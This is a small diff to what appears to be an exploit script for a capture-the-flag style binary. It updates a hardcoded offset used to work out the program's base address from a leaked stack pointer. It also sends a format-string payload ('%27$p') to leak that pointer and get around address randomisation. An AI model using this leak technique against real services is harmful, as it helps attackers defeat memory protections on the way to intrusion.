@@ -17,7 +17,7 @@ def start():
 p = start()
 
 # Calculate offset from 21th value in stack to pie base without aslr
-offset = 0x555555555275 - 0x555555554000
+offset = 0x5555555552bd - 0x555555554000
 
 payload = b"%27$p"
 p.sendline(payload)
